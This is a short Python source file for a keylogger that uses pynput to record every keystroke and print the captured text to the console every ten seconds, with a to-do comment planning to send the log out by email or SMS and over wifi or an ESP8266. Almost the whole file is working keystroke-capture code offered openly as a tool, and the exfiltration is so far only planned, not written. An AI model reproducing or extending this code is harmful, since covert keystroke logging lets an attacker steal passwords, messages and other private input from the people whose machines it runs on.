import pynput.keyboard
import threading
import os

"""
To be add:

- log file send to email or sms 
- conection on wifi??
- conection os esp8266
- add args in the code

"""

class Keylogger:
    def __init__(self, time_interval, log_file):
        self.log = log_file
        self.interval = time_interval
        self.log = ""

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

def main():
    keylogger = Keylogger(10, "keylog.txt")
    keylogger.start()

if __name__ == "__main__":
    main()